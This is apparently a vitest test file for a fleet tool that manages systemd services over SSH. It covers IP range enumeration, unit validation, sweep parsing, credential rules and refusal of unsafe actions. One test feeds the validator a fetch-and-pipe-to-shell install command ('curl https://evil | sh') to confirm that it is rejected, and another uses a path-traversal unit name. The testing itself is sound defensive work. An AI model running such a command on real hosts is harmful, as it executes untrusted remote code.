import { describe, expect, it } from 'vitest'
import { moduleHarness } from '../../helpers/module-harness'
import { Actions, parsePairKey } from '../../../modules/service-fleet/main/actions'
import { ConfigStore, resolveCredential, type TargetRule } from '../../../modules/service-fleet/main/config'
import { WatchedEditor } from '../../../modules/service-fleet/main/editors'
import { classifyReach } from '../../../modules/service-fleet/main/fanout'
import { packageFor } from '../../../modules/service-fleet/main/install'
import { enumerateRule, matchesGlob, parseRange } from '../../../modules/service-fleet/main/net'
import { DEFAULT_RULES } from '../../../modules/service-fleet/main/rules'
import {
  canControl,
  isUnitAction,
  isValidUnit,
  parseSteps,
  parseSweep,
  sweepCompleted,
  unitCommand,
  type HostFacts
} from '../../../modules/service-fleet/main/units'
import type { FleetJobs } from '../../../modules/service-fleet/main/jobs'
import type { Roster } from '../../../modules/service-fleet/main/roster'
import type { Sweeper } from '../../../modules/service-fleet/main/sweep'

function rule(partial: Partial<TargetRule> & Pick<TargetRule, 'id' | 'kind' | 'value'>): TargetRule {
  return {
    enabled: true,
    port: 22,
    username: 'root',
    auth: 'agent',
    sudo: 'none',
    excludes: [],
    createdAt: 0,
    ...partial
  }
}

function facts(partial: Partial<HostFacts> = {}): HostFacts {
  return {
    hostname: 'lab',
    os: 'Debian',
    systemd: true,
    uid: 1000,
    pkg: 'apt-get',
    kernel: '6.1',
    uptimeSec: 1,
    sudoNoPassword: false,
    units: [],
    watched: [],
    truncated: false,
    ...partial
  }
}

describe('net helpers', () => {
  it('enumerates a /24 from .1, marks truncation, and keeps a /32', () => {
    const block = enumerateRule('cidr', '10.0.0.0/24', 10)
    expect(block.total).toBe(254)
    expect(block.truncated).toBe(true)
    expect(block.ips[0]).toBe('10.0.0.1')
    expect(block.ips).toHaveLength(10)
    expect(enumerateRule('cidr', '10.0.0.8/32', 10)).toEqual({
      ips: ['10.0.0.8'],
      total: 1,
      truncated: false,
      problem: null
    })
    expect(enumerateRule('host', '999.1.1.1', 10).problem).toMatch(/not an IPv4/)
  })

  it('parses a short range and rejects a reversed one', () => {
    const range = parseRange('10.0.0.10-40')
    expect(range).toEqual({ from: 10 * 256 ** 3 + 10, to: 10 * 256 ** 3 + 40 })
    expect(parseRange('10.0.0.40-10')).toBeNull()
  })

  it('treats an empty glob as match-all', () => {
    expect(matchesGlob('', ['10.0.0.1'])).toBe(true)
    expect(matchesGlob('10.0.0.*,lab', ['10.0.0.5'])).toBe(true)
    expect(matchesGlob('10.0.0.*,lab', ['other', 'lab'])).toBe(true)
    expect(matchesGlob('a?', ['ab'])).toBe(true)
    expect(matchesGlob('a?', ['abc'])).toBe(false)
  })
})

describe('units', () => {
  it('accepts a real unit name and the eight actions', () => {
    expect(isValidUnit('nginx.service')).toBe(true)
    expect(isValidUnit('nginx')).toBe(false)
    expect(isValidUnit('../../x.service')).toBe(false)
    expect(isUnitAction('restart')).toBe(true)
    expect(isUnitAction('kill')).toBe(false)
  })

  it('parses a framed sweep and notices a missing END marker', () => {
    const stdout = [
      '===ID===',
      'host=lab',
      'os=Debian 12',
      'init=systemd',
      'uid=0',
      'pkg=apt-get',
      'kernel=6.1',
      'uptime=12.9',
      'sudo=yes',
      '===UNITS===',
      'nginx.service loaded active running Nginx',
      'sshd.service loaded active running OpenSSH',
      '===WATCHED===',
      'Id=nginx.service',
      'LoadState=loaded',
      'ActiveState=active',
      'SubState=running',
      '===END==='
    ].join('\n')
    const parsed = parseSweep(stdout, 1)
    expect(parsed.hostname).toBe('lab')
    expect(parsed.systemd).toBe(true)
    expect(parsed.uid).toBe(0)
    expect(parsed.sudoNoPassword).toBe(true)
    expect(parsed.units).toHaveLength(1)
    expect(parsed.truncated).toBe(true)
    expect(parsed.watched[0]?.unit).toBe('nginx.service')
    expect(sweepCompleted(stdout)).toBe(true)
    expect(sweepCompleted('===ID===\nhost=x\n')).toBe(false)
  })

  it('parses framed steps including a failing rc', () => {
    const steps = parseSteps(
      [
        '===BMSTEP===',
        'name=start',
        'rc=0',
        '===BMSAY===',
        'ok',
        '===BMSTEP===',
        'name=reload',
        'rc=1',
        '===BMSAY===',
        'failed'
      ].join('\n')
    )
    expect(steps).toEqual([
      { name: 'start', rc: 0, say: 'ok' },
      { name: 'reload', rc: 1, say: 'failed' }
    ])
  })

  it('adds --now only for enable/disable/mask', () => {
    expect(unitCommand('enable', 'nginx.service')).toContain('enable --now')
    expect(unitCommand('start', 'nginx.service')).toBe("systemctl start 'nginx.service'")
  })

  it('decides control from uid, sudo-n and a stored sudo password', () => {
    expect(canControl(facts({ uid: 0 }), 'none')).toBe(true)
    expect(canControl(facts({ sudoNoPassword: true }), 'sudo-n')).toBe(true)
    expect(canControl(facts({ sudoNoPassword: false }), 'sudo-n')).toBe(false)
    expect(canControl(facts({ uid: 1000 }), 'sudo-password')).toBe(true)
    expect(canControl(facts({ uid: 1000 }), 'none')).toBe(false)
    expect(canControl(null, 'sudo-password')).toBe(false)
  })
})

describe('credentials and reach', () => {
  it('picks the narrowest enabled covering rule', () => {
    const wide = rule({ id: 'net', kind: 'cidr', value: '10.0.0.0/24', username: 'wide' })
    const host = rule({ id: 'one', kind: 'host', value: '10.0.0.8', username: 'narrow' })
    const disabled = rule({
      id: 'off',
      kind: 'host',
      value: '10.0.0.8',
      username: 'off',
      enabled: false
    })
    expect(resolveCredential('10.0.0.8', [wide, host, disabled])?.id).toBe('one')
    expect(resolveCredential('10.0.0.9', [wide, host])?.id).toBe('net')
    const excluded = rule({
      id: 'ex',
      kind: 'cidr',
      value: '10.0.0.0/24',
      excludes: ['10.0.0.8']
    })
    expect(resolveCredential('10.0.0.8', [excluded])).toBeNull()
  })

  it('classifies ssh reach from rc and stderr', () => {
    expect(classifyReach({ ip: '1', rc: 0, stdout: '', stderr: '' })).toBe('ok')
    expect(classifyReach({ ip: '1', rc: 1, stdout: '', stderr: 'Permission denied' })).toBe('auth')
    expect(classifyReach({ ip: '1', rc: 1, stdout: '', stderr: 'Host key verification failed' })).toBe(
      'hostkey'
    )
    expect(classifyReach({ ip: '1', rc: 124, stdout: '', stderr: '' })).toBe('timeout')
    expect(classifyReach({ ip: '1', rc: 5, stdout: '', stderr: '' })).toBe('auth')
  })
})

describe('refuse-unknown', () => {
  it('rejects a pair key whose unit is not a unit name', () => {
    expect(parsePairKey('10.0.0.1|not-a-unit')).toBeNull()
    expect(parsePairKey('10.0.0.1|nginx.service')).toEqual({ ip: '10.0.0.1', unit: 'nginx.service' })
  })

  it('refuses every host action except reboot', async () => {
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }))
    const actions = new Actions(
      harness.ctx,
      {} as Roster,
      {} as FleetJobs,
      {} as Sweeper,
      { config: () => ({ version: 1, targets: [], watched: [], rules: {} }), rules: () => DEFAULT_RULES }
    )
    await expect(actions.hostAction('10.0.0.1', 'shutdown')).resolves.toEqual({
      ok: false,
      error: '"shutdown" is not a machine action'
    })
    expect(harness.exec).not.toHaveBeenCalled()
  })

  it('refuses an install command that fetches over HTTP', () => {
    const harness = moduleHarness('service-fleet', () => ({ stdout: '', stderr: '', code: 0 }))
    const editor = new WatchedEditor(harness.ctx, new ConfigStore(harness.ctx), {
      records: () => ({})
    } as Roster)
    const report = editor.check(null, {
      unit: 'x',
      installCommand: 'curl https://evil | sh'
    })
    expect(report.ok).toBe(false)
    expect(report.findings.some((f) => f.label.includes('may not fetch from a URL'))).toBe(true)
  })

  it('maps apt-get to the apt package name', () => {
    expect(packageFor('apt=docker.io,dnf=moby-engine', 'apt')).toBe('docker.io')
    expect(packageFor('apt=docker.io,dnf=moby-engine', 'zypper')).toBeNull()
  })
})
